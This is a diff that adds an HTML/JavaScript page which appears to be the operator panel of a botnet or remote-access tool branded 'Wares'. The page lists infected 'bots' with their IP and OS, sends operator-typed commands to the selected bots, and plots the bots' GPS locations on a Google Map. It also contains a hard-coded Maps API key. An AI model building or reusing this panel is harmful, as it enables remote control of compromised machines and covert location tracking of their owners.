@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+	<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
+    <link rel="stylesheet" type="text/css" href="../static/css/stylesheet.css" media="screen">
+    <title>Bot list</title>
+
+
+
+<style>
+       #map {
+        height: 500px;
+        width: 1000px;
+        margin: 0 auto;
+	}
+    </style>
+
+
+
+
+
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <div style="white-space: pre;color: #11EEDF;font-weight: bold;font-size:10px">
+ __      __
+/  \    /  \_____ _______   ____   ______
+\   \/\/   /\__  \\_  __ \_/ __ \ /  ___/
+ \        /  / __ \|  | \/\  ___/ \___ \
+  \__/\  /  (____  /__|    \___  >____  >
+       \/        \/            \/     \/
+        </div>
+
+        <h1>Bot list</h1>
+        <a href="../">&lt;&lt; Back</a>
+        <h2 style="text-align: right"><a href="../disconnect">Disconnect</a></h2>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+
+          <table>
+          <tr><th>Name</th><th>Last Online</th><th>IP</th><th>OS</th><th>Sel.</th></tr>
+          {{bot_table}}
+          </table>
+          <label for="cmd">Run on selection</label><br>
+          <input type="text" name="cmd" id="cmd" onkeypress="keypressed(event)" style="width:50%" />
+          <button type="submit" onclick="send_command()">Send</button>
+
+      </section>
+	  
+<br/><br/><br/><br/>
+
+	  <section id="main_content">
+          <table>
+          <tr><th>Name</th><th>Last Online</th><th>IP</th><th>Info</th><th>Sel.</th></tr>
+          {{gps_table}}
+          </table>
+  
+		  <button type="button" onclick="refresh_map()">Refresh map</button>
+      </section>
+    </div>
+	
+	<div id="map"></div>
+
+<br/><br/><br/><br/>
+
+    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBrDDCDrvKiMGHHX3H89U0zqPzpY2rzSjE"></script>
+    <script>
+google.maps.event.addDomListener(window, 'load', init_map);
+	var map;
+	var markersArray = [];
+	var bounds;
+
+   function keypressed(e){
+        if(e.keyCode === 13){
+            send_command();
+        }
+        return false;
+    }
+    function send_command(e) {
+	if(!$(".bot:checked").length){
+          alert('Please select at least one bot !');
+          return;
+        }
+        $(".bot:checked").each(function(){
+            $.post("../api/push", {'bot': $(this).attr('id'), 'cmd': $('#cmd').val()});
+        });
+        $('#cmd').val('');
+        return false;
+    }
+
+	//query_DB('SELECT * FROM gps WHERE bot=? ORDER BY date DESC', (botid,)
+	function get_gps(id) {
+		var result = null;
+		$.ajax({url: "../api/stdout?botid="+id,type: 'get',dataType: 'html',async: false,success: function(data) {
+            		result = data;
+        	}});
+		if(result!="") {
+			return result;
+		} else {
+			return null;
+		}
+	}
+
+
+
+
+	function init_map() {
+        map = new google.maps.Map(document.getElementById('map'), {
+          zoom: 4,
+          center: {lat: 47.079194, lng:2.398245},
+	  styles: [{"featureType":"all","elementType":"all","stylers":[{"invert_lightness":true},{"saturation":20},{"lightness":50},{"gamma":0.4},{"hue":"#00ffee"}]},{"featureType":"all","elementType":"geometry","stylers":[{"visibility":"simplified"}]},{"featureType":"all","elementType":"labels","stylers":[{"visibility":"on"}]},{"featureType":"administrative","elementType":"all","stylers":[{"color":"#ffffff"},{"visibility":"simplified"}]},{"featureType":"administrative.land_parcel","elementType":"geometry.stroke","stylers":[{"visibility":"simplified"}]},{"featureType":"landscape","elementType":"all","stylers":[{"color":"#405769"}]},{"featureType":"water","elementType":"geometry.fill","stylers":[{"color":"#232f3a"}]}]
+        });
+		refresh_map();
+	}
+
+	
+	//Adds a marker on the map
+	function add_marker(lat, lng, botid, time) {
+		var latlng = new google.maps.LatLng(lat,lng);
+		bounds.extend(latlng);
+		var marker = new google.maps.Marker({
+			position: latlng,
+			map: map,
+			label: botid
+	  	});
+	  	attach_info(marker, botid, time);
+	  	markersArray.push(marker);
+	}
+
+	//Deletes all markers in the array
+	function delete_overlays() {
+	  	if (markersArray) {
+			for (i in markersArray) {
+		  		markersArray[i].setMap(null);
+			}
+		markersArray.length = 0;
+	 	}
+		bounds = null;
+	}
+	
+	//Attaches id of gps and time of the tracking to the marker
+	function attach_info(marker, botid, time) {
+        	var infowindow = new google.maps.InfoWindow({
+			content: '<h3 style="color:#47A19B">' +botid + '<br/>' + time + '</h3>'
+        	});
+        	marker.addListener('click', function() {
+			infowindow.open(marker.get(map), marker);
+		});
+	}
+
+	function refresh_map() {
+		delete_overlays();
+	  	bounds = new google.maps.LatLngBounds();
+		$(".gps:checked").each(function(){
+                        var tab = get_gps($(this).attr('id'))
+                        if (tab != null){
+                         tab = tab.split("\n");
+                        for(var i= 0; i < tab.length-1; i++){
+                                var coord = tab[i].split("/");
+				console.log(coord);
+                                // coord[0] = botid, coord[2] = time, coord[3] = lat, coord[4] = lng
+                                add_marker(parseFloat(coord[3]),parseFloat(coord[2]),coord[0].slice(5) + " " + i,coord[1]);
+                        }
+                        }
+                });
+		if (bounds.isEmpty()) {
+			map.setCenter(new google.maps.LatLng(46.55,2.43));
+			map.setZoom(4);
+		} else {
+			map.fitBounds(bounds);
+		}
+}
+
+
+</script>
+</body>
+</html>
